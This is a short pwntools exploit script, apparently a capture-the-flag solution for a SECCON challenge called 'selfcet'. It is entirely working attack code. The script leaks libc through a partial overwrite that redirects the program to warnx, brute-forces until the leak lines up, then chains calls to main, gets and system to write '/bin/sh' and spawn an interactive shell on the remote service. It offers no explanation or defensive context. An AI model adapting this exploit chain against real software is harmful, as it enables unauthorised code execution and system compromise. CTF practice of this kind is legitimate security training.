#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./xor", checksec=False)
libc = ELF("./libc.so.6")


def start(argv=[], *a, **kw):
    nc = "nc selfcet.seccon.games 9999"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}
while True:
    io = start()

    # read = 0x0000000000403fe8
    write_fptr = 0x0000000000403fd0

    write_sym = libc.symbols["write"]

    payload = b"A" * 0x40
    payload += flat(0, write_fptr) + b"\xd0\x10"  # partial overwrite to warnx
    io.send(payload)

    try:
        io.recvuntil(b"xor: ", timeout=1)
        write_leak = u64(io.recv(6, timeout=1).ljust(8, b"\x00"))
    except EOFError:
        io.close()
        continue
    log.info(f"{write_leak=:#x}")
    if write_leak & 0xfff != write_sym & 0xfff:
        io.close()
        continue

    libc.address = write_leak - write_sym
    log.info(f"{libc.address=:#x}")

    payload = b"A" * 0x20
    payload += flat(elf.symbols["main"],
                    1,  # status
                    libc.symbols["__libc_start_main"])
    io.send(payload)

    payload = b"A" * 0x40
    payload += flat(0, elf.bss(0xa00), libc.symbols["gets"])
    time.sleep(0.5)
    io.send(payload)

    io.sendline(b"/bin/sh\x00")

    payload = b"A" * 0x20
    payload += flat(0,
                    elf.bss(0xa00),
                    libc.symbols["system"])
    time.sleep(0.5)
    io.send(payload)

    io.interactive()
    quit()
